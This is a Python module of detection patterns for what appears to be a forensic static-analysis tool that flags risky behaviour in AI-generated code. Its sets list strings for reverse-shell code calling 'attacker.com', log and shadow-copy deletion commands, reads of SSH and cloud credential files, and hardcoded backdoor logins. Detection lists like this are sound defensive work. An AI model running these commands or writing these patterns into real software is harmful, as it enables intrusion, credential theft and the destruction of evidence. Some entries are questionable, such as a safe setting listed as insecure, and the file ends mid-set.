# behavior_mappings.py
# Complete behavior mapping file for TrustGuard project
# AI-Assisted Forensic Framework for Detection, Threat Scoring, and Explainable Analysis

"""
Behavior Mappings for TrustGuard AI-Assisted Forensic Framework

This module contains comprehensive mappings of Python API calls and patterns
organized by behavior category for static analysis of AI-generated code.

Categories:
- NETWORK_CALLS: Outbound network communication
- NETWORK_RECEIVE_CALLS: Inbound network reception  
- FILE_READ_CALLS: File system read operations
- FILE_WRITE_CALLS: File system write operations
- FILE_DELETE_CALLS: File system deletion operations
- PROCESS_CALLS: Process creation and execution
- EVAL_EXEC_CALLS: Dynamic code execution
- OBFUSCATION_CALLS: Code obfuscation techniques
- RECON_CALLS: System reconnaissance
- CREDENTIAL_ACCESS_CALLS: Credential theft
- PERSISTENCE_CALLS: Persistence mechanisms
- RANSOMWARE_CALLS: Ransomware indicators
- ANTI_FORENSICS_CALLS: Anti-forensic techniques
- DATA_EXFILTRATION_CALLS: Data exfiltration
- LOGIC_BOMB_PATTERNS: Time/condition triggered malware
- BACKDOOR_INDICATORS: Hidden access mechanisms
- DEPENDENCY_RISK: Risky dependencies
- INSECURE_CONFIG: Insecure configuration patterns
"""


# ============================================================================
# NETWORK CALLS - Outbound Communication
# ============================================================================

NETWORK_CALLS = {
    # Original mappings
    "requests.get",
    "requests.post",
    "requests.put",
    "requests.delete",
    "socket.connect",
    "socket.send",
    "socket.sendall",
    
    # Additional HTTP/S libraries
    "requests.head",
    "requests.patch",
    "requests.options",
    "requests.request",
    "urllib.request.urlopen",
    "urllib.request.urlretrieve",
    "urllib3.request",
    "urllib3.PoolManager.request",
    "httpx.get",
    "httpx.post",
    "httpx.put",
    "httpx.delete",
    "httpx.patch",
    "httpx.request",
    "httpx.Client.get",
    "httpx.Client.post",
    "aiohttp.ClientSession.get",
    "aiohttp.ClientSession.post",
    "aiohttp.ClientSession.put",
    "aiohttp.ClientSession.delete",
    "aiohttp.ClientSession.patch",
    "aiohttp.ClientSession.request",
    "aiohttp.ClientSession.ws_connect",
    
    # Additional socket operations
    "socket.create_connection",
    "socket.socket.connect",
    "socket.socket.send",
    "socket.socket.sendall",
    "socket.socket.sendto",
    "asyncio.open_connection",
    "asyncio.open_unix_connection",
    "asyncio.StreamWriter.write",
    "asyncio.StreamWriter.drain",
    
    # FTP
    "ftplib.FTP.connect",
    "ftplib.FTP.login",
    "ftplib.FTP.storbinary",
    "ftplib.FTP.retrbinary",
    "ftplib.FTP.storlines",
    "ftplib.FTP.retrlines",
    "ftplib.FTP.nlst",
    "ftplib.FTP.dir",
    
    # SMTP/Email
    "smtplib.SMTP.sendmail",
    "smtplib.SMTP_SSL.sendmail",
    "smtplib.SMTP.connect",
    "smtplib.SMTP.login",
    
    # SSH/Paramiko
    "paramiko.SSHClient.exec_command",
    "paramiko.SSHClient.connect",
    "paramiko.SSHClient.invoke_shell",
    "paramiko.Transport.connect",
    "paramiko.SFTPClient.put",
    "paramiko.SFTPClient.get",
    "paramiko.SFTPClient.open",
    
    # DNS
    "socket.gethostbyname",
    "socket.getaddrinfo",
    "socket.gethostbyname_ex",
    "dns.resolver.query",
    "dns.resolver.resolve",
    
    # WebSockets
    "websockets.connect",
    "websockets.serve",
    "websockets.client.connect",
    "websockets.server.serve",
    
    # Telnet
    "telnetlib.Telnet.open",
    "telnetlib.Telnet.read_until",
    "telnetlib.Telnet.write",
    
    # Other HTTP clients
    "http.client.HTTPConnection.request",
    "http.client.HTTPSConnection.request",
    "xmlrpc.client.ServerProxy",
    "xmlrpc.client.Transport.request",
    "xmlrpc.client.ServerProxy._ServerProxy__request",
}


# ============================================================================
# NETWORK RECEIVE CALLS - Inbound Communication
# ============================================================================

NETWORK_RECEIVE_CALLS = {
    # Original
    "requests.get",
    "socket.recv",
    
    # Additional
    "socket.recvfrom",
    "socket.recv_into",
    "socket.accept",
    "asyncio.StreamReader.read",
    "asyncio.StreamReader.readline",
    "http.server.BaseHTTPRequestHandler",
    "http.server.SimpleHTTPRequestHandler",
    "socketserver.TCPServer",
    "socketserver.UDPServer",
    "socket.socket.recv",
    "socket.socket.recvfrom",
    "socket.socket.recv_into",
    "socket.socket.accept",
}


# ============================================================================
# PROCESS CALLS - Process Creation/Execution
# ============================================================================

PROCESS_CALLS = {
    # Original
    "subprocess.run",
    "subprocess.Popen",
    "subprocess.call",
    "subprocess.check_output",
    "os.system",
    "os.popen",
    
    # Additional subprocess
    "subprocess.Popen.communicate",
    "subprocess.Popen.wait",
    "subprocess.Popen.terminate",
    "subprocess.Popen.kill",
    "subprocess.Popen.send_signal",
    "subprocess.getoutput",
    "subprocess.check_call",
    "subprocess.list2cmdline",
    
    # Additional os process calls
    "os.execv",
    "os.execve",
    "os.execvp",
    "os.execl",
    "os.execlp",
    "os.spawnl",
    "os.spawnle",
    "os.spawnlp",
    "os.spawnv",
    "os.spawnve",
    "posix.spawn",
    
    # Multiprocessing
    "multiprocessing.Process.start",
    "multiprocessing.Process.run",
    "multiprocessing.pool.Pool",
    "multiprocessing.pool.ApplyResult",
    "threading.Thread.start",
    
    # Windows-specific
    "win32process.CreateProcess",
    "win32process.CreateProcessAsUser",
    "ctypes.windll.kernel32.CreateProcess",
    "ctypes.windll.kernel32.WinExec",
    "ctypes.windll.kernel32.ShellExecute",
    "ctypes.windll.kernel32.CreateRemoteThread",
    "ctypes.windll.kernel32.VirtualAllocEx",
    "ctypes.windll.kernel32.WriteProcessMemory",
    "ctypes.windll.kernel32.VirtualProtectEx",
    "ctypes.windll.kernel32.GetProcAddress",
    "ctypes.windll.kernel32.LoadLibraryA",
    
    # POSIX/Linux-specific
    "os.fork",
    "os.forkpty",
    "os.setsid",
    "os.setuid",
    "os.setgid",
    "os.seteuid",
    "os.setegid",
    
    # Pexpect
    "pexpect.spawn",
    "pexpect.run",
    "pexpect.popen_spawn.PopenSpawn",
    
    # Docker/Container
    "docker.client.from_env",
    "docker.containers.run",
    "docker.containers.exec_run",
    "docker.api.container.ContainerApiMixin",
}


# ============================================================================
# FILE READ CALLS
# ============================================================================

FILE_READ_CALLS = {
    # Core Python file operations
    "open",  # Must check mode: 'r' or binary
    "file.read",
    "file.readline",
    "file.readlines",
    
    # Codecs
    "codecs.open",
    "io.open",
    
    # Pathlib
    "pathlib.Path.read_text",
    "pathlib.Path.read_bytes",
    "pathlib.Path.open",
    
    # Shutil - copy operations read source
    "shutil.copyfile",
    "shutil.copy",
    "shutil.copy2",
    "shutil.copytree",
    
    # Directory listing
    "os.listdir",
    "os.scandir",
    "os.walk",
    "glob.glob",
    "glob.iglob",
    "pathlib.Path.glob",
    "pathlib.Path.rglob",
    
    # Archive extraction
    "zipfile.ZipFile.read",
    "zipfile.ZipFile.extract",
    "zipfile.ZipFile.extractall",
    "zipfile.ZipFile.namelist",
    "tarfile.TarFile.extract",
    "tarfile.TarFile.extractall",
    "tarfile.TarFile.getmembers",
    
    # Serialization
    "pickle.load",
    "pickle.loads",
    "json.load",
    "json.loads",
    "yaml.load",
    "yaml.safe_load",
    "yaml.full_load",
    "yaml.unsafe_load",
    
    # Config files
    "configparser.ConfigParser.read",
    "configparser.ConfigParser.read_file",
    
    # XML parsing
    "xml.etree.ElementTree.parse",
    "xml.etree.ElementTree.fromstring",
    "xml.dom.minidom.parse",
    "xml.dom.minidom.parseString",
    "xml.sax.parse",
    "xml.sax.parseString",
    
    # CSV
    "csv.reader",
    "csv.DictReader",
    
    # Pandas
    "pandas.read_csv",
    "pandas.read_excel",
    "pandas.read_json",
    "pandas.read_sql",
    "pandas.read_table",
    "pandas.read_parquet",
    "pandas.read_feather",
    "pandas.read_hdf",
    "pandas.read_pickle",
    
    # Numpy
    "numpy.load",
    "numpy.fromfile",
    "numpy.genfromtxt",
    "numpy.loadtxt",
}


# ============================================================================
# FILE WRITE CALLS
# ============================================================================

FILE_WRITE_CALLS = {
    # Core Python file operations
    "open",  # Must check mode: 'w', 'a', 'x', 'wb', 'ab'
    "file.write",
    "file.writelines",
    
    # Pathlib
    "pathlib.Path.write_text",
    "pathlib.Path.write_bytes",
    "pathlib.Path.mkdir",
    "pathlib.Path.touch",
    
    # Copy operations (write destination)
    "shutil.copy",
    "shutil.copyfile",
    "shutil.copy2",
    "shutil.copytree",
    "shutil.move",
    
    # Archive creation
    "zipfile.ZipFile.write",
    "zipfile.ZipFile.writestr",
    "tarfile.TarFile.add",
    "tarfile.TarFile.addfile",
    "shutil.make_archive",
    
    # Serialization
    "pickle.dump",
    "pickle.dumps",
    "json.dump",
    "json.dumps",
    "yaml.dump",
    "yaml.safe_dump",
    "yaml.dump_all",
    "yaml.safe_dump_all",
    
    # CSV
    "csv.writer",
    "csv.DictWriter",
    
    # Pandas
    "pandas.DataFrame.to_csv",
    "pandas.DataFrame.to_excel",
    "pandas.DataFrame.to_json",
    "pandas.DataFrame.to_sql",
    "pandas.DataFrame.to_parquet",
    "pandas.DataFrame.to_feather",
    "pandas.DataFrame.to_hdf",
    "pandas.DataFrame.to_pickle",
    
    # Numpy
    "numpy.save",
    "numpy.savetxt",
    "numpy.savez",
    "numpy.savez_compressed",
    "numpy.ndarray.tofile",
    
    # Temp files
    "tempfile.NamedTemporaryFile",
    "tempfile.TemporaryFile",
    "tempfile.mkstemp",
    "tempfile.mkdtemp",
    "tempfile.SpooledTemporaryFile",
    
    # Database creation
    "sqlite3.connect",  # Creates/opens database
    "sqlalchemy.create_engine",
}


# ============================================================================
# FILE DELETE CALLS
# ============================================================================

FILE_DELETE_CALLS = {
    "os.remove",
    "os.unlink",
    "os.rmdir",
    "os.removedirs",
    "shutil.rmtree",
    "pathlib.Path.unlink",
    "pathlib.Path.rmdir",
    "tempfile.TemporaryDirectory.cleanup",
    "tempfile._TemporaryFileCloser.close",
}


# ============================================================================
# EVAL/EXEC CALLS - Dynamic Code Execution
# ============================================================================

EVAL_EXEC_CALLS = {
    # Original
    "eval",
    "exec",
    "compile",
    
    # Builtins access
    "builtins.eval",
    "builtins.exec",
    "builtins.compile",
    "__builtins__.__dict__['eval']",
    "__builtins__.__dict__['exec']",
    "globals()['__builtins__'].eval",
    "globals()['__builtins__'].exec",
    
    # Dynamic imports
    "__import__",
    "importlib.import_module",
    "importlib.__import__",
    "builtins.__import__",
    
    # Python 2
    "execfile",
    
    # Function executors
    "globals().__setitem__",
    "locals().__setitem__",
    "object.__setattr__",
    "type.__call__",
    "types.FunctionType",
    "types.CodeType",
    
    # Reflection
    "getattr",
    "setattr",
    "hasattr",
    "delattr",
    
    # Custom executors
    "pdb.run",
    "pdb.runeval",
    "pdb.runcall",
    "cProfile.run",
    "trace.Trace.run",
    
    # AST manipulation
    "ast.literal_eval",
    "ast.parse",
    "compile",
    
    # Dynamically calling methods
    "methodcaller",
    "operator.methodcaller",
}


# ============================================================================
# OBFUSCATION CALLS
# ============================================================================

OBFUSCATION_CALLS = {
    # Original
    "base64.b64encode",
    "base64.b64decode",
    "base64.encodebytes",
    "zlib.compress",
    "zlib.decompress",
    "gzip.compress",
    "binascii.hexlify",
    "pickle.dumps",
    "json.dumps",
    
    # Additional encoding
    "codecs.encode",
    "codecs.decode",
    "bytes.decode",
    "bytes.encode",
    "str.encode",
    "str.decode",
    
    # Additional compression
    "lzma.compress",
    "lzma.decompress",
    "bz2.compress",
    "bz2.decompress",
    "zlib.crc32",
    "zlib.adler32",
    
    # Hashing (can be used for obfuscation)
    "hashlib.md5",
    "hashlib.sha1",
    "hashlib.sha256",
    "hashlib.sha512",
    "hashlib.blake2b",
    "hashlib.blake2s",
    "hashlib.new",
    "hashlib.pbkdf2_hmac",
    
    # URL encoding
    "urllib.parse.quote",
    "urllib.parse.unquote",
    "urllib.parse.quote_plus",
    "urllib.parse.unquote_plus",
    
    # String manipulation
    "string.Template.substitute",
    "string.Template.safe_substitute",
    
    # XOR (via bytes)
    "bytes.__xor__",
    
    # Encryption (can obfuscate)
    "cryptography.fernet.Fernet.encrypt",
    "cryptography.fernet.Fernet.decrypt",
    
    # Custom encoding
    "binascii.b2a_base64",
    "binascii.a2b_base64",
    "binascii.b2a_hex",
    "binascii.a2b_hex",
    "binascii.b2a_uu",
    "binascii.a2b_uu",
    "binascii.b2a_hqx",
    "binascii.a2b_hqx",
}


# ============================================================================
# RECONNAISSANCE CALLS
# ============================================================================

RECON_CALLS = {
    # Original
    "socket.gethostname",
    "os.getenv",
    "os.environ.get",
    "platform.system",
    "platform.machine",
    "platform.node",
    "os.getlogin",
    
    # Network recon
    "socket.gethostbyname",
    "socket.getaddrinfo",
    "socket.if_nameindex",
    "socket.gethostbyaddr",
    "socket.getfqdn",
    
    # IP lookup services
    "requests.get('https://api.ipify.org')",
    "requests.get('https://checkip.amazonaws.com')",
    "requests.get('https://icanhazip.com')",
    "requests.get('https://ifconfig.me/ip')",
    "requests.get('https://ident.me')",
    
    # System information
    "platform.platform",
    "platform.processor",
    "platform.python_version",
    "platform.release",
    "platform.version",
    "os.uname",
    "sys.platform",
    "sys.version",
    "sys.executable",
    "sys.path",
    "os.cpu_count",
    "sys.getsizeof",
    "sys.getrecursionlimit",
    
    # PSUtil
    "psutil.cpu_count",
    "psutil.cpu_percent",
    "psutil.cpu_times",
    "psutil.virtual_memory",
    "psutil.swap_memory",
    "psutil.disk_usage",
    "psutil.disk_partitions",
    "psutil.net_if_addrs",
    "psutil.net_connections",
    "psutil.net_io_counters",
    "psutil.users",
    "psutil.boot_time",
    
    # User information
    "os.getuid",
    "os.geteuid",
    "os.getgid",
    "os.getgroups",
    "pwd.getpwuid",
    "pwd.getpwnam",
    "grp.getgrnam",
    "os.environ",
    "os.getenv",
    
    # File system recon
    "os.listdir",
    "os.scandir",
    "os.walk",
    "os.stat",
    "os.path.exists",
    "os.path.isfile",
    "os.path.isdir",
    "os.path.getsize",
    "os.path.getmtime",
    "os.path.getatime",
    "os.path.getctime",
    "glob.glob",
    "pathlib.Path.exists",
    "pathlib.Path.is_file",
    "pathlib.Path.is_dir",
    "pathlib.Path.stat",
    
    # Process recon
    "psutil.pids",
    "psutil.Process",
    "psutil.process_iter",
    "os.getpid",
    "os.getppid",
    "os.times",
    
    # Windows-specific
    "win32api.GetComputerName",
    "win32api.GetUserName",
    "win32api.GetSystemMetrics",
    "win32com.client.GetObject('winmgmts:')",
    "wmi.WMI",
    "ctypes.windll.kernel32.GetSystemInfo",
    "ctypes.windll.kernel32.GetComputerNameA",
    "ctypes.windll.kernel32.GetUserNameA",
    "ctypes.windll.kernel32.GetCurrentProcessId",
    
    # Linux-specific
    "subprocess.run(['uname', '-a'])",
    "subprocess.run(['cat', '/etc/os-release'])",
    "subprocess.run(['lsb_release', '-a'])",
    "subprocess.run(['whoami'])",
    "subprocess.run(['hostname'])",
    "subprocess.run(['id'])",
    "subprocess.run(['pwd'])",
}


# ============================================================================
# PERSISTENCE CALLS
# ============================================================================

PERSISTENCE_CALLS = {
    # Original
    "winreg.SetValueEx",
    "winreg.OpenKey",
    
    # Windows Registry (expanded)
    "winreg.CreateKey",
    "winreg.DeleteKey",
    "winreg.SetValue",
    "winreg.SetValueEx",
    "winreg.OpenKey",
    "winreg.ConnectRegistry",
    
    # Linux Cron
    "subprocess.run(['crontab', ...])",
    "open('/etc/crontab', 'w')",
    "open('/etc/cron.d/', 'w')",
    "open('/var/spool/cron/', 'w')",
    "open('/var/spool/cron/crontabs/', 'w')",
    "croniter.croniter",
    
    # Systemd
    "subprocess.run(['systemctl', 'enable', ...])",
    "subprocess.run(['systemctl', 'start', ...])",
    "subprocess.run(['systemctl', 'daemon-reload'])",
    "systemd.service.Service",
    "systemd.daemon.Daemon",
    
    # Startup files (Linux/Unix)
    "shutil.copy('...', '/etc/init.d/')",
    "shutil.copy('...', '/usr/local/bin/')",
    "shutil.copy('...', '/Library/LaunchDaemons/')",
    "shutil.copy('...', '/Library/LaunchAgents/')",
    "open(os.path.expanduser('~/.bashrc'), 'a')",
    "open(os.path.expanduser('~/.zshrc'), 'a')",
    "open(os.path.expanduser('~/.profile'), 'a')",
    
    # Windows startup
    "os.path.join('APPDATA', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')",
    "os.path.join('PROGRAMDATA', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')",
    "shutil.copy('...', startup_path)",
    
    # Scheduled tasks (Windows)
    "subprocess.run(['schtasks', '/create', ...])",
    "subprocess.run(['schtasks', '/change', ...])",
    "subprocess.run(['schtasks', '/run', ...])",
    "win32com.client.Dispatch('Schedule.Service')",
    
    # Launchd (macOS)
    "shutil.copy('...', '/Library/LaunchDaemons/')",
    "shutil.copy('...', '/Library/LaunchAgents/')",
    "launchd.plist",
    
    # Windows Services
    "win32serviceutil.ServiceFramework",
    "win32serviceutil.InstallService",
    "win32serviceutil.StartService",
    "win32service.ChangeServiceConfig",
    "win32service.CreateService",
}


# ============================================================================
# CREDENTIAL ACCESS CALLS
# ============================================================================

CREDENTIAL_ACCESS_CALLS = {
    # Environment variables
    "os.getenv",
    "os.environ.get",
    "os.environ.__getitem__",
    "os.environ.pop",
    "os.environ.setdefault",
    
    # Keyring
    "keyring.get_password",
    "keyring.set_password",
    "keyring.delete_password",
    "keyring.get_credential",
    
    # Windows Credential Manager
    "win32cred.CredRead",
    "win32cred.CredEnumerate",
    "win32cred.CredWrite",
    "win32cred.CredDelete",
    "win32cred.CredGetTargetInfo",
    
    # Browser cookies
    "browser_cookie3.load",
    "browser_cookie3.FirefoxCookieJar",
    "browser_cookie3.ChromeCookieJar",
    "browser_cookie3.EdgeCookieJar",
    "browser_cookie3.OperaCookieJar",
    "browser_cookie3.BraveCookieJar",
    "browser_cookie3.VivaldiCookieJar",
    
    # SSH keys
    "paramiko.RSAKey.from_private_key",
    "paramiko.RSAKey.from_private_key_file",
    "paramiko.DSSKey.from_private_key",
    "paramiko.ECDSAKey.from_private_key",
    "paramiko.Ed25519Key.from_private_key",
    "open(os.path.expanduser('~/.ssh/id_rsa'), 'r')",
    "open(os.path.expanduser('~/.ssh/id_dsa'), 'r')",
    "open(os.path.expanduser('~/.ssh/id_ecdsa'), 'r')",
    "open(os.path.expanduser('~/.ssh/id_ed25519'), 'r')",
    
    # AWS credentials
    "boto3.client",
    "boto3.session.Session",
    "boto3.resource",
    "botocore.session.Session",
    "boto3.Session",
    "boto3.setup_default_session",
    "open(os.path.expanduser('~/.aws/credentials'), 'r')",
    "open(os.path.expanduser('~/.aws/config'), 'r')",
    
    # Azure credentials
    "azure.identity.DefaultAzureCredential",
    "azure.identity.ClientSecretCredential",
    "azure.identity.ClientCertificateCredential",
    "azure.identity.UsernamePasswordCredential",
    "azure.identity.EnvironmentCredential",
    "azure.identity.ManagedIdentityCredential",
    
    # GCP credentials
    "google.oauth2.service_account.Credentials",
    "google.auth.default",
    "google.auth.credentials",
    "open(os.path.expanduser('~/.config/gcloud/application_default_credentials.json'))",
    
    # Kubernetes
    "kubernetes.config.load_kube_config",
    "kubernetes.config.load_incluster_config",
    "open(os.path.expanduser('~/.kube/config'), 'r')",
    
    # Database connections
    "sqlalchemy.create_engine",
    "pymongo.MongoClient",
    "psycopg2.connect",
    "mysql.connector.connect",
    "sqlite3.connect",
    "redis.Redis",
    "memcache.Client",
    "aiomysql.connect",
    "asyncpg.connect",
    "aiosqlite.connect",
    
    # API tokens in code
    "open('token.txt')",
    "open('.env')",
    "open('.env.local')",
    "open('secrets.py')",
    "open('config.py')",
}


# ============================================================================
# RANSOMWARE INDICATORS
# ============================================================================

RANSOMWARE_CALLS = {
    # Encryption operations
    "cryptography.fernet.Fernet.encrypt",
    "cryptography.fernet.Fernet.decrypt",
    "crypto.Cipher.AES.new",
    "crypto.Cipher.DES.new",
    "crypto.Cipher.DES3.new",
    "crypto.Cipher.RSA.new",
    "crypto.Cipher.PKCS1_OAEP",
    "crypto.PublicKey.RSA.import_key",
    "crypto.PublicKey.RSA.export_key",
    "nacl.secret.SecretBox",
    "nacl.public.Box",
    "nacl.public.PrivateKey",
    "nacl.public.PublicKey",
    "nacl.encoding.HexEncoder",
    
    # File renaming with encrypted extension
    "os.rename",
    "os.replace",
    "shutil.move",
    "pathlib.Path.rename",
    "pathlib.Path.replace",
    
    # File operations for ransomware
    "os.remove",
    "shutil.rmtree",
    "os.unlink",
    
    # Ransom note creation
    "open('README.txt', 'w')",
    "open('DECRYPT.txt', 'w')",
    "open('HOW_TO_DECRYPT.txt', 'w')",
    "open('RECOVER.txt', 'w')",
    
    # Common ransomware patterns
    "subprocess.run(['rm', '-rf', ...])",  # Delete shadow copies
    "subprocess.run(['vssadmin', 'delete', 'shadows', ...])",
    "subprocess.run(['wmic', 'shadowcopy', 'delete', ...])",
    "subprocess.run(['bcdedit', '/set', ...])",
    "subprocess.run(['shutdown', '/r', '/t', ...])",
    
    # Windows-specific ransomware
    "ctypes.windll.advapi32.CryptEncrypt",
    "ctypes.windll.advapi32.CryptDecrypt",
    "ctypes.windll.advapi32.CryptAcquireContextA",
    "ctypes.windll.advapi32.CryptGenKey",
    "ctypes.windll.advapi32.CryptExportKey",
}


# ============================================================================
# ANTI-FORENSICS CALLS
# ============================================================================

ANTI_FORENSICS_CALLS = {
    # Original
    "os.remove",
    "os.unlink",
    "shutil.rmtree",
    "os.rename",
    "os.replace",
    
    # File timestamps
    "os.utime",
    "os.chmod",
    "os.chown",
    "os.lchown",
    
    # File truncation
    "os.truncate",
    "file.truncate",
    
    # Memory mapping (avoid disk traces)
    "mmap.mmap",
    "tempfile.TemporaryFile",
    "tempfile.SpooledTemporaryFile",
    "tempfile.NamedTemporaryFile",
    
    # Directory removal
    "os.removedirs",
    "pathlib.Path.unlink",
    "pathlib.Path.rmdir",
    
    # Log clearing
    "open('/var/log/auth.log', 'w')",
    "open('/var/log/syslog', 'w')",
    "open('/var/log/messages', 'w')",
    "open('/var/log/secure', 'w')",
    "open('/var/log/faillog', 'w')",
    "subprocess.run(['journalctl', '--vacuum-size=1M'])",
    "subprocess.run(['journalctl', '--flush'])",
    "subprocess.run(['rm', '-rf', '/var/log/*'])",
    "subprocess.run(['rm', '-rf', '/var/log/audit/*'])",
    "subprocess.run(['find', '/var/log', '-type', 'f', '-delete'])",
    
    # Windows event log clearing
    "subprocess.run(['wevtutil', 'cl', 'System'])",
    "subprocess.run(['wevtutil', 'cl', 'Application'])",
    "subprocess.run(['wevtutil', 'cl', 'Security'])",
    "subprocess.run(['wevtutil', 'cl', 'Windows PowerShell'])",
    
    # History clearing
    "open(os.path.expanduser('~/.bash_history'), 'w')",
    "open(os.path.expanduser('~/.zsh_history'), 'w')",
    "open(os.path.expanduser('~/.history'), 'w')",
    "subprocess.run(['history', '-c'])",
    "subprocess.run(['history', '-w'])",
    "os.environ['HISTFILE'] = '/dev/null'",
    "os.environ['HISTSIZE'] = '0'",
    
    # Shadow file access
    "open('/etc/shadow', 'r')",
    "open('/etc/passwd', 'r')",
    "open('/etc/sudoers', 'r')",
    "open('/etc/gshadow', 'r')",
    
    # Windows registry cleanup
    "winreg.DeleteKey",
    "winreg.DeleteValue",
    "winreg.FlushKey",
}


# ============================================================================
# DATA EXFILTRATION CALLS
# ============================================================================

DATA_EXFILTRATION_CALLS = {
    # Database extraction
    "sqlite3.connect",
    "sqlite3.Cursor.execute",
    "sqlalchemy.create_engine",
    "pymongo.MongoClient",
    "psycopg2.connect",
    "mysql.connector.connect",
    "redis.Redis",
    "memcache.Client",
    
    # File compression (preparation for exfil)
    "zipfile.ZipFile",
    "zipfile.ZipFile.write",
    "tarfile.TarFile",
    "tarfile.TarFile.add",
    "shutil.make_archive",
    "gzip.open",
    "gzip.compress",
    "bz2.open",
    "bz2.compress",
    "lzma.open",
    "lzma.compress",
    
    # Encrypted transmission
    "ssl.wrap_socket",
    "ssl.create_default_context",
    "ssl.SSLContext.wrap_socket",
    "asyncio.open_connection(ssl=True)",
    "requests.post(data=encrypted_data)",
    "httpx.post(data=encrypted_data)",
    
    # Email exfil
    "smtplib.SMTP",
    "smtplib.SMTP_SSL",
    "email.message.EmailMessage",
    "email.encoders",
    "MIMEBase.MIMEBase",
    "MIMEMultipart.MIMEMultipart",
    "MIMEText.MIMEText",
    "MIMEImage.MIMEImage",
    "MIMEAudio.MIMEAudio",
    "MIMEApplication.MIMEApplication",
    
    # FTP exfil
    "ftplib.FTP.storbinary",
    "ftplib.FTP.storlines",
    "ftplib.FTP.mkd",
    "ftplib.FTP.rename",
    
    # SFTP exfil
    "paramiko.SFTPClient.put",
    "paramiko.SFTPClient.putfo",
    "paramiko.SFTPClient.mkdir",
    "paramiko.SFTPClient.rename",
    
    # Web exfil
    "requests.post",
    "requests.put",
    "urllib.request.urlopen",
    "httpx.post",
    "httpx.put",
    "aiohttp.ClientSession.post",
    "aiohttp.ClientSession.put",
    "http.client.HTTPConnection.request",
    "http.client.HTTPSConnection.request",
    
    # DNS exfil
    "socket.sendto",  # DNS queries
    "dns.resolver.query",
    "dns.message.make_query",
    "dns.message.from_wire",
    
    # Data serialization
    "pickle.dumps",
    "json.dumps",
    "yaml.dump",
    "yaml.safe_dump",
    "xml.etree.ElementTree.tostring",
    "xml.dom.minidom.toxml",
}


# ============================================================================
# LOGIC BOMB PATTERNS
# ============================================================================

LOGIC_BOMB_PATTERNS = {
    # Time-based triggers
    "datetime.datetime.now",
    "datetime.date.today",
    "time.time",
    "time.localtime",
    "calendar.month",
    "calendar.day",
    "datetime.timedelta",
    "datetime.datetime",
    
    # Date comparisons
    "datetime.datetime.strptime",
    "datetime.datetime.fromtimestamp",
    "datetime.datetime.combine",
    
    # Host-based triggers
    "socket.gethostname",
    "platform.node",
    "os.uname",
    "platform.system",
    "socket.gethostbyname",
    "socket.gethostbyaddr",
    
    # User-based triggers
    "os.getlogin",
    "pwd.getpwuid",
    "os.getuid",
    "os.geteuid",
    "getpass.getuser",
    
    # Condition patterns
    "if datetime.now() > datetime(2026, 1, 1):",
    "if datetime.now().month == 1 and datetime.now().day == 1:",
    "if socket.gethostname() == 'target':",
    "if os.getlogin() == 'admin':",
    "if random.random() < 0.01:",  # Probabilistic trigger
    "if os.path.exists('/tmp/trigger'):",
    "if len(sys.argv) > 1 and sys.argv[1] == '--trigger':",
}


# ============================================================================
# BACKDOOR INDICATORS
# ============================================================================

BACKDOOR_INDICATORS = {
    # Hidden authentication
    "if username == 'admin' and password == 'password123':",
    "if username == 'root' and password == 'toor':",
    "if username == 'backdoor' and password == 'secret':",
    "if username == 'admin' and password in ['admin', 'password', '123456']:",
    
    # Secret routes (web)
    "@app.route('/admin')",
    "@app.route('/hidden')",
    "@app.route('/backdoor')",
    "@app.route('/secret')",
    "@app.route('/debug')",
    "@app.route('/shell')",
    "@app.route('/cmd')",
    "@app.route('/exec')",
    "@app.route('/eval')",
    
    # Hardcoded credentials
    "PASSWORD = 'admin123'",
    "API_KEY = 'sk-1234567890'",
    "SECRET_KEY = 'supersecret'",
    "TOKEN = 'ghp_abcdefghijklmnop'",
    "PASS = 'password'",
    
    # Authentication bypass
    "if user == 'admin' or True:",
    "if user == 'admin' and password == '':",
    "if user == 'admin' and password is None:",
    "if user == 'admin' and password in allowed:",
    "login_required = False",
    "auth_required = False",
    "require_login = False",
    
    # Shell access
    "subprocess.Popen(['/bin/sh'])",
    "subprocess.Popen(['/bin/bash'])",
    "subprocess.Popen(['cmd.exe'])",
    "subprocess.Popen(['powershell.exe'])",
    
    # Reverse shell patterns
    "socket.connect(('attacker.com', 4444))",
    "subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
    "os.dup2(s.fileno(), 0)",
    "os.dup2(s.fileno(), 1)",
    "os.dup2(s.fileno(), 2)",
    "pty.spawn('/bin/sh')",
}


# ============================================================================
# RISKY DEPENDENCIES
# ============================================================================

RISKY_DEPENDENCIES = {
    # Known vulnerable or suspicious packages
    "requests",  # High usage, common target for typosquatting
    "urllib3",   # Common target for typosquatting
    "cryptography",  # Sensitive operations
    "paramiko",  # SSH operations
    "pymongo",   # Database access
    "psycopg2",  # Database access
    "sqlalchemy",  # Database access
    "flask",     # Web framework
    "django",    # Web framework
    "fastapi",   # Web framework
    
    # Packages commonly typosquatted
    "torch", "torchvision",  # Often typosquatted as "torch" vs "torch2"
    "tensorflow",  # Often typosquatted
    "scikit-learn",  # Often typosquatted
    "numpy",  # Often typosquatted
    "pandas",  # Often typosquatted
    "matplotlib",  # Often typosquatted
    "selenium",  # Often typosquatted
    "beautifulsoup4",  # Often typosquatted
    "Pillow",  # Often typosquatted
    "pycryptodome",  # Often confused with pycrypto
    "opencv-python",  # Often typosquatted
}


# ============================================================================
# INSECURE CONFIGURATION PATTERNS
# ============================================================================

INSECURE_CONFIG_PATTERNS = {
    # Flask
    "app.config['DEBUG'] = True",
    "app.config['SECRET_KEY'] = 'secret'",
    "app.config['SECRET_KEY'] = 'changeme'",
    "app.config['SECRET_KEY'] = ''",
    "app.config['SESSION_COOKIE_SECURE'] = False",
    "app.config['SESSION_COOKIE_HTTPONLY'] = False",
    
    # Django
    "DEBUG = True",
    "SECRET_KEY = 'changeme'",
    "SECRET_KEY = 'secret'",
    "ALLOWED_HOSTS = ['*']",
    "SESSION_COOKIE_SECURE = False",
    "CSRF_COOKIE_SECURE = False",
    "X_FRAME_OPTIONS = 'DENY'",
    
    # JWT
    "JWT_SECRET_KEY = 'secret'",
    "JWT_SECRET_KEY = 'changeme'",
    "JWT_SECRET_KEY = ''",
    
    # Database
    "DATABASE_URL = 'postgresql://user:password@localhost/db'",
    "DATABASE_URL = 'mysql://user:password@localhost/db'",
    "DATABASE_URL = 'sqlite:///test.db'",  # In production
    
    # Redis
    "REDIS_URL = 'redis://localhost:6379/0'",
    "REDIS_PASSWORD = ''",  # No password
    
    # General
    "PASSWORD = 'password'",
    "SECRET = 'secret'",
